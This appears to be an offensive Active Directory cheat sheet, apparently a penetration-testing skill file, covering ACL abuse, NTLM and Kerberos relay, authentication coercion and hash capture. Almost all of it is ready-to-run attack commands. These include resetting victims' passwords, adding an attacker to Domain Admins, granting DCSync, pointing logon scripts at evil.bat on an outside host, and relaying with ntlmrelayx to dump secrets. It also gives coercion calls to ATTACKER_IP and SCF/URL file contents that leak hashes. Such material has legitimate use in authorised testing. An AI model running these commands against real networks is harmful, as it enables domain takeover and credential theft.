# ACL/ACE Abuse, NTLM Relay & Coercion

## ACL/ACE Abuse

### Find Interesting ACLs

```ps1
# PowerView
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
Get-ObjectAcl -SamAccountName target -ResolveGUIDs

# ADACLScanner
ADACLScan.ps1 -Base "DC=contoso,DC=com" -Filter "(&(AdminCount=1))" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show

# bloodyAD
bloodyAD --host DC -d domain.lab -u user -p pass get writable --otype USER --right WRITE --detail
```

### GenericAll / GenericWrite

**On User** - Targeted Kerberoasting:
```ps1
# Set SPN, request ticket, remove SPN
bloodyAD --host DC -d domain.lab -u attacker -p pass set object TARGET serviceprincipalname -v 'ops/whatever1'
GetUserSPNs.py -dc-ip DC 'domain.lab/attacker:pass' -request-user TARGET
bloodyAD --host DC -d domain.lab -u attacker -p pass set object TARGET serviceprincipalname

# PowerView
Set-DomainObject TARGET -Set @{serviceprincipalname='ops/whatever1'}
$User = Get-DomainUser TARGET | Get-DomainSPNTicket
Set-DomainObject TARGET -Clear serviceprincipalname
```

**On User** - Targeted ASREPRoasting:
```ps1
bloodyAD --host DC -d domain.lab -u attacker -p pass add uac TARGET -f DONT_REQ_PREAUTH
GetNPUsers.py domain/TARGET -format hashcat -outputfile hashes.asrep
bloodyAD --host DC -d domain.lab -u attacker -p pass remove uac TARGET -f DONT_REQ_PREAUTH
```

**On User** - Reset Password:
```ps1
bloodyAD --host DC -d DOMAIN -u attacker -p :NTHASH set password john.doe 'NewPass123!'
rpcclient -U 'attacker%pass' -W DOMAIN -c "setuserinfo2 victim 23 NewPass!"
# PowerShell
$pass = ConvertTo-SecureString 'NewPass!' -AsPlainText -Force
Set-DomainUserPassword -Identity victim -AccountPassword $pass
```

**On Group** - Add self to group:
```ps1
bloodyAD --host DC -d domain.lab -u attacker -p pass add groupMember 'Domain Admins' attacker
net group "domain admins" attacker /add /domain
net rpc group ADDMEM "GROUP" attacker -U 'attacker%pass' -W DOMAIN -I DC_IP
```

**WriteProperty on scriptpath** - logon script execution:
```ps1
bloodyAD --host DC -d domain.lab -u attacker -p pass set object victim scriptpath -v '\\10.0.0.5\evil.bat'
Set-ADObject -SamAccountName victim -PropertyName scriptpath -PropertyValue '\\10.0.0.5\evil.bat'
```

**GenericWrite on RCM** - override start program in RDP (requires RCM enabled, deprecated in >2016):
```ps1
bloodyAD --host DC -d domain.lab -u attacker -p pass set object victim msTSInitialProgram -v '\\10.0.0.5\evil.exe'
bloodyAD --host DC -d domain.lab -u attacker -p pass set object victim msTSWorkDirectory -v 'C:\'
```

### WriteDACL

**On Domain** - grant DCSync:
```ps1
bloodyAD --host DC -d DOMAIN -u attacker -p :NTHASH add dcsync victim
# Remove after use
bloodyAD --host DC -d DOMAIN -u attacker -p :NTHASH remove dcsync victim

# PowerView
Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity victim
```

**On Group** - grant GenericAll:
```ps1
bloodyAD --host DC -d corp -u attacker -p pass add genericAll 'cn=GROUP,dc=corp' attacker
Add-DomainObjectAcl -TargetIdentity "GROUP" -Rights WriteMembers -PrincipalIdentity attacker
```

### WriteOwner

```ps1
bloodyAD --host DC -d corp -u attacker -p pass set owner target_object attacker
Set-DomainObjectOwner -Identity target_object -OwnerIdentity attacker
```

### ReadLAPSPassword / ReadGMSAPassword

```ps1
# LAPS
bloodyAD -u user -p pass -d domain.lab --host DC get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd
Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd'

# GMSA
bloodyAD -u user -p pass -d domain --host DC get object 'gmsaAccount$' --attr msDS-ManagedPassword
$gmsa = Get-ADServiceAccount -Identity 'SVC_ACCT' -Properties 'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $gmsa.'msDS-ManagedPassword'
```

### ForceChangePassword

```ps1
bloodyAD --host DC -d DOMAIN -u attacker -p :NTHASH set password victim NewPass123!
rpcclient -U 'attacker%pass' -W DOMAIN -c "setuserinfo2 victim 23 NewPass!"
$NewPass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity victim -AccountPassword $NewPass
```

### OU ACL Abuse

**GenericAll on OU** - inherit FullControl on all child objects:
```ps1
dacledit.py -action write -rights FullControl -inheritance -principal attacker -target-dn 'OU=SERVERS,DC=lab,DC=local' 'lab.local/attacker:pass'

# Verify inheritance
dacledit.py -action read -principal attacker -target-dn 'CN=server,OU=SERVERS,DC=lab,DC=local' 'lab.local/attacker:pass'
```

**gPLink abuse** - OUned tool:
```ps1
# GenericWrite OR Manage Group Policy links + machine account + DNS
sudo python3 OUned.py --config config.ini
sudo python3 OUned.py --config config.ini --just-coerce
```

---

## NTLM Relay

### Hash Reference

| Hash | Hashcat | Attack |
|------|---------|--------|
| LM | 3000 | crack/PTH |
| NTLM | 1000 | crack/PTH |
| NTLMv1 | 5500 | crack/relay |
| NTLMv2 | 5600 | crack/relay |

### Relay Prerequisites

| Target | Requirement |
|--------|------------|
| SMB | SMB signing disabled |
| LDAP | LDAP signing disabled + channel binding off |
| LDAPS | Always open to relay (from non-signing client) |
| HTTP/ADCS | Open to relay |

### Core Relay Setup (Responder + ntlmrelayx)

```ps1
# 1. Disable SMB/HTTP in Responder (so ntlmrelayx handles them)
# Edit /etc/responder/Responder.conf: SMB=Off, HTTP=Off
sudo responder -I eth0 -wfrd -P -v

# 2. Generate relay target list
netexec smb 10.0.0.0/24 --gen-relay-list relay.txt

# 3. Relay to SMB (dump SAM)
ntlmrelayx.py -tf relay.txt -smb2support

# 4. Relay to LDAP (add computer account - requires MAQ>0, no LDAP signing)
ntlmrelayx.py -t ldaps://DC_IP --add-computer

# 5. SOCKS proxy mode
ntlmrelayx.py -tf relay.txt -socks -smb2support
ntlmrelayx> socks   # list sessions
proxychains netexec smb 10.10.10.10 -u user -p '' --shares
proxychains secretsdump.py domain/user@10.10.10.10
```

### IPv6 / mitm6

```ps1
# DHCPv6 DNS takeover (Windows prefers IPv6 over IPv4)
mitm6 -i eth0 -d domain.local
ntlmrelayx.py -6 -wh ATTACKER_IP -of loot -tf relay.txt
ntlmrelayx.py -6 -wh ATTACKER_IP -t ldaps://DC_IP -wh ATTACKER_IP --add-computer
```

### Relay to LDAP for RBCD (CVE-2019-1040 / Drop the MIC)

```ps1
# Relay SMB→LDAP with --remove-mic to bypass MIC
ntlmrelayx.py --remove-mic --escalate-user user1 -t ldap://DC -smb2support
# OR create machine account with RBCD
ntlmrelayx.py -t ldaps://DC --remove-mic --delegate-access -smb2support
```

### Relay to ADCS (ESC8)

```ps1
ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs
ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# Output: base64 cert → use with Rubeus/certipy
Rubeus.exe asktgt /user:DC$ /certificate:BASE64CERT /ptt
```

### Relay to RPC/ICPR (ESC11)

```ps1
certipy relay -target rpc://DC -ca 'DOMAIN-CA' -template DomainController
ntlmrelayx.py -t rpc://DC_IP -rpc-mode ICPR -icpr-ca-name lab-DC-CA -smb2support
```

### NTLM Reflection (CVE-2025-33073)

```ps1
# Add DNS A record with magic suffix
dnstool.py -u 'domain.local\user' -p 'pass' DC_IP -a add -r target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d ATTACKER_IP
# Start relay to target
ntlmrelayx.py -t smb://TARGET.domain.local -smb2support
# Trigger via PetitPotam
petitpotam.py -d domain.local -u user -p pass "TARGET1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" "TARGET.DOMAIN.LOCAL"
```

### WebDav Relay (HTTP auth instead of SMB)

```ps1
# Check WebDav service
nxc smb 10.10.10.10 -d domain -u user -p pass -M webdav

# Relay with RBCD
ntlmrelayx.py -t ldaps://DC --delegate-access -smb2support
# Trigger (must use NETBIOS name, not IP)
PetitPotam.py "ATTACKER_NETBIOS@80/test.txt" TARGET_IP
dementor.py -d DOMAIN -u user -p pass "ATTACKER_NETBIOS@80/test.txt" TARGET_IP
```

### RemotePotato0 (DCOM relay - requires foothold in session 0)

```ps1
socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 &
ntlmrelayx.py -t ldap://DC --no-wcf-server --escalate-user winrm_user
RemotePotato0.exe -r ATTACKER_IP -p 9998 -s 2
psexec.py 'DOMAIN/winrm_user:pass@DC'
```

### Shadow Credentials via Relay

```ps1
ntlmrelayx.py -t ldaps://DC --shadow-credentials --shadow-target 'dc01$'
# Then use Certipy/PKINITtools to auth with the generated cert
```

### Port 445 Forwarding

```ps1
# PortBender (driver-based)
rportfwd 8445 127.0.0.1 445
PortBender redirect 445 8445
ntlmrelayx.py -t smb://TARGET -smb2support

# smbtakeover (unbind 445)
python3 smbtakeover.py domain/admin:pass@TARGET stop
rportfwd_local 445 127.0.0.1 445
```

---

## Coercion Techniques

### Signing Status Reference

| OS | SMB Sign | LDAP Sign |
|----|----------|-----------|
| WS2019/2022 DC | ✅ | ❌ |
| WS2022 23H2+ DC | ✅ | ✅ |
| WS2025 DC | ✅ | ✅ |
| WS2019/2022 Member | ❌ | - |
| Win10/11 | ❌/✅ | - |

```ps1
# Check EPA enforcement
uv run relayinformer ldap --method BOTH --dc-ip DC_IP --user user --password pass
```

### MS-RPRN - PrinterBug (SpoolSample)

```ps1
nxc smb DC -d domain -u user -p pass -M spooler        # check service
nxc smb 10.10.10.0/24 -u user -p pass -M coerce_plus -o METHOD=PrinterBug
SpoolSample.exe TARGET ATTACKER_IP
python3 printerbug.py domain.local/user:pass@TARGET ATTACKER_IP
```

### MS-EFSR - PetitPotam

```ps1
nxc smb 10.10.10.0/24 -u user -p pass -M coerce_plus -o METHOD=PetitPotam
python3 petitpotam.py -d domain -u user -p pass ATTACKER_IP DC_IP
PetitPotam.exe ATTACKER_IP DC_IP
```

### MS-DFSNM - DFSCoerce

```ps1
python3 dfscoerce.py -u user -d domain.local 10.10.10.10 10.10.10.11
nxc smb 10.10.10.0/24 -u user -p pass -M coerce_plus -o METHOD=DFSCoerce
```

### MS-WSP - WSPCoerce (workstations only)

```ps1
# Target must be short hostname (no FQDN), listener use FQDN for Kerberos auth
WSPCoerce.exe target listener_ip
wspcoerce 'domain/user:pass@target.ip' "file:////attacksystem/share"
```

---

## Kerberos Relay

### Over HTTP (LLMNR Poisoning + krbrelayx)

```ps1
# ESC8 via LLMNR/multicast poison
python3 Responder.py -I eth0 -N <PKI_NETBIOS>
krbrelayx.py --target 'http://PKI.DOMAIN.LOCAL/certsrv/' -ip ATTACKER_IP --adcs --template User
```

### Over DNS (mitm6 + krbrelayx)

```ps1
# ESC8 via DNS + IPv6
krbrelayx.py --target http://adscert.domain.local/certsrv/ -ip ATTACKER_IP --victim TARGET.domain.local --adcs --template Machine
mitm6 --domain domain.local --host-allowlist TARGET --relay ADCS_SERVER -v
gettgtpkinit.py -pfx-base64 CERT domain.local/TARGET$ TARGET.ccache
```

### Over SMB (KrbRelay)

```ps1
dnstool.py -u 'DOMAIN\\user' -p pass -r "pki1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d ATTACKER_IP --action add DC_IP --tcp
petitpotam.py -u user -p pass -d DOMAIN 'pki1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' DC_IP
krbrelayx.py -t 'http://pki.domain.local/certsrv/certfnsh.asp' --adcs --template DomainController -v 'DC$'
gettgtpkinit.py -cert-pfx 'DC$.pfx' 'DOMAIN.LOCAL/DC$' DC.ccache
```

### Kerberos Reflection (CVE-2025-33073)

```ps1
dnstool.py -u 'domain.local\user' -p pass DC_IP -a add -r target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d ATTACKER_IP
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
petitpotam.py -d domain -u user -p pass "TARGET1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" "TARGET.DOMAIN.LOCAL"
```

---

## SMB Shares — Hash Capture via Files

```ps1
# Find/enumerate shares
nxc smb 10.0.0.4 -u guest -p '' -M spider_plus
smbmap -H 10.10.10.10 -d DOMAIN.LOCAL -u user -p pass
Snaffler.exe -d domain.local -c DC -s  # hunt for sensitive files

# Drop SCF/URL/LNK files on writable share → harvest NTLM
# Farmer (automated)
farmer.exe 8888 0 c:\output.tmp
Crop.exe \\fileserver\common mdsec.url \\workstation@8888\mdsec.ico

# Manual SCF file (@trigger.scf)
[Shell]
Command=2
IconFile=\\ATTACKER_IP\Share\test.ico

# URL file
[InternetShortcut]
URL=whatever
IconFile=\\ATTACKER_IP\%USERNAME%.icon
IconIndex=1

# NetExec modules
nxc smb TARGET -u user -p pass -M scuffy -o NAME=WORK SERVER=ATTACKER_IP   # SCF
nxc smb TARGET -u user -p pass -M slinky -o NAME=WORK SERVER=ATTACKER_IP   # LNK
nxc smb TARGET -u user -p pass -M slinky -o NAME=WORK SERVER=ATTACKER_IP CLEANUP

# Library-ms / searchConnector-ms files (place in share, triggers on browse)
# See SKILL.md examples for XML content
```
